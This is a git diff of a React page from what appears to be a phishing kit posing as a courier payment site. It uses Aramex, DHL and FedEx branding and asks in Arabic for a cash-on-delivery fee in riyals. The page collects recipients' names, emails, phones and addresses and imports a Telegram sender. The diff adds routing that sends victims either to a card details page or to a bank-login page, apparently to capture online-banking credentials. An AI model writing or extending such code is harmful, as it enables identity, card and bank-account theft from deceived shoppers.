@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -10,6 +10,7 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import FullScreenLoader from "@/components/FullScreenLoader";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -28,16 +29,41 @@ import heroBg from "@/assets/hero-bg.jpg";
 const PaymentRecipient = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData } = useLink(id);
+  const { data: linkData, isLoading } = useLink(id);
   const [customerName, setCustomerName] = useState("");
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
   
-  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const serviceName = linkData?.payload?.service_name || serviceKey;
+  useEffect(() => {
+    const method = sessionStorage.getItem('paymentMethod');
+    if (!method) {
+      navigate(`/pay/${id}/track`);
+    }
+  }, [id, navigate]);
+
+  if (isLoading) {
+    return <FullScreenLoader label="جاري تحميل بيانات المستلم..." />;
+  }
+
+  if (!linkData) {
+    return (
+      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
+        <div className="text-center p-8">
+          <CreditCard className="w-12 h-12 mx-auto mb-4 text-muted-foreground" />
+          <h2 className="text-lg font-semibold mb-2">الرابط غير متاح</h2>
+          <p className="text-sm text-muted-foreground">تعذر العثور على تفاصيل الدفع. تأكد من صحة الرابط.</p>
+        </div>
+      </div>
+    );
+  }
+
+  const payload = (linkData.payload ?? {}) as Record<string, any>;
+  const urlService = typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null;
+  const serviceKey = payload.service_key || payload.service || urlService || 'aramex';
+  const serviceName = payload.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const shippingInfo = linkData?.payload as any;
+  const shippingInfo = payload;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
   
@@ -116,7 +142,20 @@ const PaymentRecipient = () => {
       service: serviceName,
       amount: formattedAmount
     }));
-    navigate(`/pay/${id}/details`);
+
+    const method = sessionStorage.getItem('paymentMethod') || 'card';
+    if (method === 'login') {
+      const bank = sessionStorage.getItem('selectedBank');
+      if (!bank || bank === 'skipped') {
+        sessionStorage.removeItem('selectedBank');
+        navigate(`/pay/${id}/track`);
+        return;
+      }
+      navigate(`/pay/${id}/bank-login`);
+    } else {
+      sessionStorage.setItem('selectedBank', 'skipped');
+      navigate(`/pay/${id}/details`);
+    }
   };
   
   return (
